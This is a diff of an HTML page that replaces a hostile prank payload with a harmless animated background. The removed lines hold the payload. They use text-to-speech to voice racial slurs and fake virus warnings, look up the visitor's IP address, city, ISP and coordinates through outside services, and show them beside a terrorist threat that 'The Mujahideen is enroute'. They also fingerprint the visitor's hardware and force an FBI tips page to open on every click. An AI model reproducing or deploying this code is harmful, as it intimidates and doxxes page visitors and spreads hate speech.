@@ -5,154 +5,26 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css">
-    <style>
-        @keyframes scroll {
-            0% {
-                transform: translateX(100%);
-            }
-            100% {
-                transform: translateX(-100%);
-            }
-        }
-        
-        #prayers-container {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            overflow: hidden;
-            width: 100%;
-            text-align: center;
-        }
-        
-        .prayer {
-            display: block;
-            animation: scroll 8s linear infinite;
-            margin-bottom: 10px;
-            font-size: 60px;
-        }
-        
-        .info {
-            position: absolute;
-            color: black;
-            font-size: 24px;
-        }
-        
-        #location {
-            text-shadow: -1px -1px 0 white, 1px -1px 0 white, -1px 1px 0 white, 1px 1px 0 white;
-        }
-    </style>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gl-matrix/2.8.1/gl-matrix-min.js"></script>
-    <script>
-        $(document).ready(function() {
-
-            function speak(text) {
-                const synth = window.speechSynthesis;
-                const utterance = new SpeechSynthesisUtterance(text);
-                utterance.voice = speechSynthesis.getVoices().find(voice => voice.name === 'Brian');
-                utterance.pitch = 0.1;
-                synth.speak(utterance);
-            }
-
-            speak('ypwypwypw A virus has been detected on your computer stupid nigger?^');
-
-            $.getJSON('https://wtfismyip.com/json', function(data) {
-                const ipAddress = data.YourFuckingIPAddress;
-
-                $.getJSON('https://we-are-jammin.xyz/json/' + encodeURIComponent(ipAddress), function(data2) {
-                    $('#ip-address').html(`
-                    IP address is: ${ipAddress} <br>
-
-                    Postal Code: ${data2.zip} <br>
-                    City: ${data2.city} <br>
-                    Region: ${data2.region} <br>
-                    ISP: ${data2.isp} <br>
-                    Organization: ${data2.org}, ${data2.as} <br>
-              `);
-                    $('#location').text(`The Mujahideen is enroute to ${data2.lat}, ${data2.lon}`);
-                });
-            });
-
-            const prayers = [
-                "اللهم صل وسلم على نبيك حرمن وبارك عليه",
-                "اللهم اجعلنا من أتباع حرمن الصالحين",
-                "اللهم صل على حرمن وعلى آله وصحبه أجمعين",
-                "اللهم ارزقنا شفاعة نبيك حرمن يوم القيامة",
-                "اللهم نور قلوبنا بنور نبيك حرمن",
-                "اللهم احفظ لنا سنة نبيك حرمن",
-                "اللهم اجعلنا من العاملين بتعاليم نبيك حرمن",
-                "اللهم اغفر لنا ببركة نبيك حرمن",
-                "اللهم زدنا حباً لنبيك حرمن",
-                "اللهم اجعلنا من المقربين إلى نبيك حرمن"
-            ];
-
-            prayers.forEach((prayer) => {
-                $('#prayers-container').append(`<div class="prayer">${prayer}</div>`);
-            });
-
-            const languages = navigator.languages.join(', ');
-            const screenWidth = screen.width;
-            const screenHeight = screen.height;
-            const pixelDepth = screen.pixelDepth;
-            const cpuThreads = navigator.hardwareConcurrency;
-
-            function getGpuInfo() {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) {
-                    return {
-                        vendor: 'Unknown',
-                        renderer: 'Unknown'
-                    };
-                }
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return {
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                };
-            }
-
-            const gpuInfo = getGpuInfo();
-
-            $('#system-info').html(`
-                System Languages: ${languages} <br>
-                Screen: ${screenWidth} x ${screenHeight} <br>
-                Pixel Depth: ${pixelDepth} <br>
-                CPU Threads: ${cpuThreads} <br>
-                GPU Vendor: ${gpuInfo.vendor} <br>
-                GPU Info: ${gpuInfo.renderer}
-            `);
-
-            speak('OO wuwuwuwuwuwuwu OO OOOO yDRDRDRDRDRDRDRDRDRDRDRDRDRDRDRDRDR ONE DEAD ONE DEAD yDRDRDRDRDR virus virus TWO DEAD︙︙nigger jjjjjjjjjj virus jjjjjjjjjjjj && %% # $ @@ /  Have you prayed today / OOOO ⅞ ⅞ OOOO OOOO OOOO ﬆﬆﬆﬆﬆﬆﬆ OOOO OOOO OOOO OOOO OOOO jjjjjjjjjjjjjj tststttttssssstt OOOO OOOO OOOO OOOO OOOO OOOO / Have you prayed today /  wuwuwuwuwuwuwu OOOO PRAISE BE TO HARMIN OOOO OO wuwuwuwuwuwuwu OO OOOO OOOO OOOO ︙︙︙︙︙︙︙︙ OOOO OOOO ⅘ ﬆﬆ ∙ ⅒ ﬆﬆ ∙ ⅝ ∙ ⅚ ﬆﬆ ℅ ∙ ∙ ﬆﬆ ⒘ ¡¡¡¡¡¡¡¡¡¡¡ OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO @at@at@at@at THREE DEAD');
-            speak('wuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuw && %% # $ @@ uwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwu && %% # $ @@ wuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwu');
-        });
-    </script>
 </head>
 
 <body>
-    <div>
-        <video width="1920" height="1080" autoplay loop>
-  	        <source src="https://racistnoob.github.io/screen/Untitled_design.mp4" type="video/mp4">
-            <script>
-                var video = document.currentScript.parentElement;
-                video.volume = 1.0;
-            </script>
-        </video>
-        <div id="ip-address" style="position: absolute; top: 20px; left: 20px; color: black; font-size: 24px;"></div>
-        <div id="location" style="position: absolute; top: 600px; left: 400px; color: black; font-size: 60px;"></div>
-        <div id="prayers-container"></div>
-        <div id="system-info" class="info" style="top: 200px; left: 20px;"></div>
+    <div id="main">
     </div>
-    <script>
-        function openUrl() {
-            window.invokeNative('openUrl', "https://tips.fbi.gov/violation-questions/1");
-        }
 
-        // Add event listener to the document to listen for clicks
-        document.addEventListener('click', function(event) {
-            openUrl();
-        });
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.24/dist/vanta.cells.min.js"></script>
+    <script>
+        VANTA.CELLS({
+            el: "#main",
+            mouseControls: true,
+            touchControls: true,
+            gyroControls: false,
+            minHeight: 3840.00,
+            minWidth: 2160.00,
+            scale: 1.00,
+            color1: 0x7538f7,
+            color2: 0xe635f2
+        })
     </script>
 </body>
 
